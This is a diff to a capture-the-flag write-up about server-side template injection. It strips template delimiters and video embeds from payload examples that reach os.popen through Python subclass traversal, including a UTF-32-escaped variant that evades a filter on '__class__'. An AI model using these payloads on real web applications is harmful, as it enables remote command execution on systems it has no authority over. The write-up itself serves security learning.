@@ -164,11 +164,6 @@ Connection: close
 [https://youtu.be/SN6EVIG4c-0?t=562](https://youtu.be/SN6EVIG4c-0?t=562)
 
 
-<iframe width="1280" height="720" src="https://www.youtube.com/embed/SN6EVIG4c-0" title="Server-Side Template Injections Explained" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
-
-
-<iframe width="1280" height="720" src="https://www.youtube.com/embed/SN6EVIG4c-0?t=562" title="Server-Side Template Injections Explained" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
-
 
 ## Crafting payload
 
@@ -176,7 +171,7 @@ Connection: close
 - I found that the server blocks `__class__` but does not block its UTF-32, so I tough that we can use the following payload to get an RCE
 - we can use the following payload to get an RCE
     
-    ```text
+    ```python
     ''.__class__.__mro__[1].__subclasses__()[207].__init__.__globals__['sys'].modules['os'].popen('echo RCE').read()
     ```
     
@@ -188,8 +183,8 @@ Connection: close
 
 ```bash
 
-{{''.__class__.__mro__[1].__subclasses__()[index_of_catch_warnings].__init__.__globals__['sys'].modules['os'].popen('echo RCE').read()}}
-{{''['__class__']['__mro__'][1]['__subclasses__'][index_of_catch_warnings]['__init__']['__globals__']['sys']['modules']['os']['popen']('id')['read']()}}
+''.__class__.__mro__[1].__subclasses__()[index_of_catch_warnings].__init__.__globals__['sys'].modules['os'].popen('echo RCE').read()
+''['__class__']['__mro__'][1]['__subclasses__'][index_of_catch_warnings]['__init__']['__globals__']['sys']['modules']['os']['popen']('id')['read']()
 
 ```
 
@@ -197,14 +192,12 @@ Connection: close
 
 by sending: 
 ```python
-{{''['__class__']['__mro__'][1]['__subclasses__']}}
+''['__class__']['__mro__'][1]['__subclasses__']
 ``` 
 in UTF-32 like the following:
 
-```
-
-{{''['\U0000005F\U0000005F\U00000063\U0000006c\U00000061\U00000073\U00000073\U0000005F\U0000005F']['\U0000005f\U0000005f\U0000006d\U00000072\U0000006f\U0000005f\U0000005f'][1]['\U0000005f\U0000005f\U00000073\U00000075\U00000062\U00000063\U0000006c\U00000061\U00000073\U00000073\U00000065\U00000073\U0000005f\U0000005f']()}}
-
+```python
+''['\U0000005F\U0000005F\U00000063\U0000006c\U00000061\U00000073\U00000073\U0000005F\U0000005F']['\U0000005f\U0000005f\U0000006d\U00000072\U0000006f\U0000005f\U0000005f'][1]['\U0000005f\U0000005f\U00000073\U00000075\U00000062\U00000063\U0000006c\U00000061\U00000073\U00000073\U00000065\U00000073\U0000005f\U0000005f']()
 ```
 
  we will get a list of the subclasses, convert it from HTML entity and remove other HTML lines, and separate each class in a like in sublime (CTRL+F → `,`  and ALT+Enter then Enter), we can find that catch_warnings in line 208, decrementing it by one because python list counts from zero not one like sublime lines, `catch_warnings` index is 207
@@ -235,7 +228,7 @@ we will get
 
 ![Untitled](/assets/images/ASCWG-Fathers-Light/Untitled%209.png)
 
-final payload without {{}}:
+final payload without:
 
 ```python
 
